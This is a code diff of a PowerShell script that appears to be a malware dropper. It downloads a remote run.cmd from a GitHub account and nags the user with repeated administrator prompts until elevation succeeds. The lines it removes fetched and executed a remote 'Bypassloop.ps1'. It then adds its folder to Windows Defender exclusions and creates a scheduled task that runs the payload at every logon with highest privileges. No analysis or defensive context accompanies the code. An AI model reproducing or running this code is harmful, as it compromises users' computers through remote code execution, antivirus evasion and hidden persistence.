@@ -5,13 +5,15 @@ New-Item -ItemType Directory -Path $dir
 $temp = "$dir\temp"
 New-Item -ItemType Directory -Path $temp
 
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$temp\run.cmd"
+
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Bypassloop.ps1" -useb)
+    while(1){try{Start-Process -Verb RunAs -FilePath '$temp\run.cmd';exit}catch{}}
 }
 
 Add-MpPreference -ExclusionPath $dir
 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$temp\run.cmd"
+
 schtasks.exe /Create /SC ONLOGON /TN Updatew /TR "$temp\run.cmd" /RL HIGHEST /F
 
 
